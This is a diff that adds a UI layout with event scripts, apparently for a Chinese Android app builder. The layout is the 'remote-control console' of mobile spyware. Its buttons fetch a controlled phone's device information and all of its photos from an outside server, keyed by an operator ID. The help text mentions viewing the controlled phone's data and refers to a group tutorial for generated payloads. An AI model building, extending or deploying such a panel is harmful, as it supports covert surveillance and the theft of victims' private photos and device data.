@@ -1,0 +1,484 @@
+<View id="1" did="0" type="RelativeLayout">
+<ppt>
+width=-1
+height=-1
+</ppt>
+<event>
+</event>
+</View>
+<View id="2" did="1" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+background=black
+</ppt>
+<event>
+</event>
+</View>
+<View id="3" did="2" type="LinearLayout">
+<ppt>
+width=-1
+height=90dp
+orientation=horizontal
+</ppt>
+<event>
+</event>
+</View>
+<View id="4" did="3" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+layout_weight=1
+gravity=center_vertical
+</ppt>
+<event>
+</event>
+</View>
+<View id="6" did="4" type="CardView">
+<ppt>
+width=-2
+height=-2
+app_CardcornerRadius=20dp
+layout_marginLeft=-10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="7" did="6" type="LinearLayout">
+<ppt>
+width=100dp
+height=-1
+orientation=vertical
+gravity=center
+BackgroundColor=#b4000000
+</ppt>
+<event>
+</event>
+</View>
+<View id="8" did="7" type="TextView">
+<ppt>width=-2
+height=-2
+text=远控控制台
+typeface=@3f12bc4a942.ttf
+textColor=#ffffffff
+textSize=13dp
+layout_marginTop=5dp
+layout_marginBottom=5dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="5" did="3" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=horizontal
+layout_weight=1
+gravity=right
+</ppt>
+<event>
+</event>
+</View>
+<View id="44" did="5" type="CardView">
+<ppt>
+width=-2
+height=-2
+layout_marginRight=20dp
+app_CardcornerRadius=5dp
+layout_gravity=center_vertical
+</ppt>
+<event>
+</event>
+</View>
+<View id="45" did="44" type="LinearLayout">
+<ppt>
+width=-2
+height=-2
+orientation=vertical
+BackgroundColor=#b4000000
+</ppt>
+<event>
+</event>
+</View>
+<View id="46" did="45" type="ImageView">
+<ppt>
+width=30dp
+height=30dp
+src=@ic_play_list_close.png
+</ppt>
+<event>
+<eventItme type="clicki">
+end()
+</eventItme>
+</event>
+</View>
+<View id="12" did="2" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+</ppt>
+<event>
+</event>
+</View>
+<View id="13" did="12" type="CardView">
+<ppt>
+width=-1
+height=-1
+app_CardcornerRadius=20dp
+layout_marginBottom=-20dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="14" did="13" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+</ppt>
+<event>
+</event>
+</View>
+<View id="15" did="14" type="LinearLayout">
+<ppt>
+width=-1
+height=60dp
+orientation=horizontal
+gravity=center_vertical
+layout_marginLeft=10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="16" did="15" type="CardView">
+<ppt>
+width=-2
+height=-2
+app_CardcornerRadius=5dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="62" did="15" type="TextView">
+<ppt>width=-2
+height=-2
+text=当前ID为：
+typeface=@3f12bc4a942.ttf
+textColor=#ff000000
+textSize=14dp
+layout_marginTop=5dp
+layout_marginBottom=5dp
+layout_marginLeft=7dp
+layout_marginRight=0dp</ppt>
+<event></event>
+</View>
+<View id="22" did="14" type="TextView">
+<ppt>
+width=-1
+height=1dp
+text=
+BackgroundColor=#b4000000
+</ppt>
+<event>
+</event>
+</View>
+<View id="23" did="14" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+visibility=visible
+</ppt>
+<event>
+</event>
+</View>
+<View id="31" did="23" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=horizontal
+layout_marginTop=15dp</ppt>
+<event>
+</event>
+</View>
+<View id="32" did="31" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+layout_weight=1
+gravity=center
+padding=3dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="34" did="32" type="CardView">
+<ppt>
+width=-1
+height=-2
+layout_marginLeft=20dp
+layout_marginRight=10dp
+app_CardBackgroundColor=#ff000000
+app_CardcornerRadius=10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="35" did="34" type="Button">
+<ppt>width=-1
+height=-2
+background=through
+text=查询设备信息
+typeface=@3f12bc4a942.ttf
+textColor=#ffffffff
+textSize=12dp
+</ppt>
+<event>
+<eventItme type="clicki">dhs(ss10,,1.1,1,1.1,1,1,0.5,1,0.5)
+dh(ss10,"duration",500)
+us(35,"dh",ss10)
+t()
+{
+  hs("http://aus-crown1.com/yk/upload/"+sss.id+"/设备.txt",ck)
+  ufnsui()
+  {
+    us(51,"visibility","gone")
+    us(70,"visibility","visible")
+    us(70,"text",ck)
+  }
+}</eventItme>
+</event>
+</View>
+<View id="33" did="31" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+layout_weight=1
+gravity=center
+</ppt>
+<event>
+</event>
+</View>
+<View id="36" did="33" type="CardView">
+<ppt>
+width=-1
+height=-2
+layout_marginLeft=10dp
+layout_marginRight=20dp
+app_CardBackgroundColor=#ff000000
+app_CardcornerRadius=10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="37" did="36" type="Button">
+<ppt>width=-1
+height=-2
+background=through
+text=查询设备所有照片
+typeface=@3f12bc4a942.ttf
+textColor=#ffffffff
+textSize=12dp
+</ppt>
+<event>
+<eventItme type="clicki">dhs(ss10,,1.1,1,1.1,1,1,0.5,1,0.5)
+dh(ss10,"duration",500)
+us(37,"dh",ss10)
+t()
+{
+  ss("http://aus-crown1.com/yk/ck.php?id="+sss.id,ck)
+  ufnsui()
+  {
+    us(51,"visibility","visible")
+    us(70,"visibility","gone")
+    us(51,"url",ck)
+    gvs(51,wv)
+    java(ws,wv,"android.webkit.WebView.getSettings")
+    java(null,ws,"android.webkit.WebSettings.setBuiltInZoomControls","boolean",true)
+    java(null,ws,"android.webkit.WebSettings.setDisplayZoomControls","boolean",false)
+    fn tw.tw("加载成功",0)
+  }
+}</eventItme>
+</event>
+</View>
+<View id="63" did="23" type="LinearLayout">
+<ppt>width=-1
+height=-2
+orientation=horizontal
+layout_marginTop=15dp</ppt>
+<event>
+</event>
+</View>
+<View id="64" did="63" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+layout_weight=1
+gravity=center
+padding=3dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="65" did="64" type="CardView">
+<ppt>
+width=-1
+height=-2
+layout_marginLeft=20dp
+layout_marginRight=10dp
+app_CardBackgroundColor=#ff000000
+app_CardcornerRadius=10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="66" did="65" type="Button">
+<ppt>width=-1
+height=-2
+background=through
+text=暂未开发
+typeface=@3f12bc4a942.ttf
+textColor=#ffffffff
+textSize=12dp
+</ppt>
+<event>
+<eventItme type="clicki">dhs(ss10,,1.1,1,1.1,1,1,0.5,1,0.5)
+dh(ss10,"duration",500)
+us(66,"dh",ss10)</eventItme>
+</event>
+</View>
+<View id="67" did="63" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+layout_weight=1
+gravity=center
+</ppt>
+<event>
+</event>
+</View>
+<View id="68" did="67" type="CardView">
+<ppt>
+width=-1
+height=-2
+layout_marginLeft=10dp
+layout_marginRight=20dp
+app_CardBackgroundColor=#ff000000
+app_CardcornerRadius=10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="69" did="68" type="Button">
+<ppt>width=-1
+height=-2
+background=through
+text=暂未开发
+typeface=@3f12bc4a942.ttf
+textColor=#ffffffff
+textSize=12dp
+</ppt>
+<event>
+<eventItme type="clicki">dhs(ss10,,1.1,1,1.1,1,1,0.5,1,0.5)
+dh(ss10,"duration",500)
+us(69,"dh",ss10)</eventItme>
+</event>
+</View>
+<View id="41" did="23" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+</ppt>
+<event>
+</event>
+</View>
+<View id="43" did="41" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+layout_marginTop=10dp
+layout_marginLeft=10dp
+layout_marginRight=10dp
+layout_marginBottom=10dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="51" did="43" type="WebView">
+<ppt>width=-1
+height=-1</ppt>
+<event></event>
+</View>
+<View id="70" did="43" type="TextView">
+<ppt>width=-2
+height=-2
+text=无
+textColor=#ff000000
+typeface=@2df75ec2de1.ttf
+textSize=15sp
+</ppt>
+<event></event>
+</View>
+<View id="38" did="14" type="LinearLayout">
+<ppt>
+width=-1
+height=-1
+orientation=vertical
+padding=20dp
+visibility=gone
+</ppt>
+<event>
+</event>
+</View>
+<View id="39" did="38" type="TextView">
+<ppt>width=-2
+height=-2
+text=使用帮助
+typeface=@3f12bc4a942.ttf
+textColor=#ff000000
+textSize=14dp
+</ppt>
+<event>
+</event>
+</View>
+<View id="40" did="38" type="TextView">
+<ppt>width=-2
+height=-2
+text=\n1:输入id(id是你的查询码，忘记就等于你后面查看不到控制手机的各种信息了)\n2:如果生成后灰包请看431577318Q群文件教程
+textSize=10dp
+</ppt>
+<event>
+</event>
+</View>
+<UIEventset>
+<eventItme type="loading">t()
+{
+  fn 环境检测.jc()
+  fn 环境检测.c()
+  fn 环境检测.aaa()
+  fn 环境检测.e()
+  fn 环境检测.g()
+  fn 环境检测.j()
+  fn 环境检测.d()
+  fn 环境检测.a()
+}
+uycl("#ff000000",true)
+us(62,"text","当前ID为："+sss.id)
+gvs(27,ss.v)
+java(null,ss.v,"android.view.View.setPadding","int",7,"int",0,"int",7,"int",0)
+gvs(30,tv)
+java(null,tv,"android.view.View.setPadding","int",7,"int",0,"int",7,"int",0)
+ngde(5,30,"#ffffffff","#57000000",back)
+us(42,"background",back)
+
+</eventItme>
+
+</UIEventset>
